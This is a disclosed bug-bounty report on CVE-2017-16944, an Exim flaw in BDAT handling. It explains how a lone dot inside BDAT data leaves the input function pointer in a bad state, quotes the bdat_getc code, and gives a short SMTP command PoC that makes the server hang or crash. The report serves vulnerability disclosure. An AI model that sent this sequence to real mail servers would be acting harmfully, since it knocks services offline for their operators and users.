# Exim handles BDAT data incorrectly and leads to crash/hang

## Report Details
- **Report ID**: 296994
- **URL**: https://hackerone.com/reports/296994
- **State**: Closed
- **Severity**: high
- **Submitted**: 2017-12-11T15:59:10.910Z
- **Disclosed**: 2019-11-12T23:47:13.399Z

## Reporter
- **Username**: mehqq
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
## Original article is [here](https://devco.re/blog/2017/12/11/Exim-RCE-advisory-CVE-2017-16943-en/)

# Incorrect BDAT data handling leads to DoS 

### Vulnerability Analysis
When receiving data with BDAT command, SMTP server should not consider a single dot `‘.’` in a line to be the end of message. However, we found exim does in receive_msg when parsing header. Like the following output:
```
220 devco.re ESMTP Exim 4.90devstart_213-7c6ec81-XX Mon, 27 Nov 2017 16:58:20 +0800
EHLO test
250-devco.re Hello root at test
250-SIZE 52428800
250-8BITMIME
250-PIPELINING
250-AUTH PLAIN LOGIN CRAM-MD5
250-CHUNKING
250-STARTTLS
250-PRDR
250 HELP
MAIL FROM:<meh@some.domain>
250 OK
RCPT TO:<meh@some.domain>
250 Accepted
BDAT 10
.
250- 10 byte chunk, total 0
250 OK id=1eJFGW-000CB0-1R
```
As we mentioned before, exim uses function pointers to switch input source. This bug makes exim go into an incorrect state because the function pointer `receive_getc` is not reset. If the next command is also a BDAT, `receive_getc` and `lwr_receive_getc` become the same and an infinite loop occurs inside `bdat_getc`. Program crashes due to stack exhaustion.
[smtp_in.c: 546 bdat_getc](https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/smtp_in.c#L546)
```
  if (chunking_data_left > 0)
    return lwr_receive_getc(chunking_data_left--);
```
This is not enough to pose a threat because exim runs a fork server. After a further analysis, we made exim go into an infinite loop without crashing, using the following commands.
```
# CVE-2017-16944 PoC by meh at DEVCORE

EHLO localhost
MAIL FROM:<meh@some.domain>
RCPT TO:<meh@some.domain>
BDAT 100
.
MAIL FROM:<meh@some.domain>
RCPT TO:<meh@some.domain>
BDAT 0 LAST
```
This makes attackers able to launch a resource based DoS attack and then force the whole server down.

## Impact

Make mail server process crash or hang. Attackers may launch a resource based DoS attack and then force the whole server down.

## Attachments
No attachments
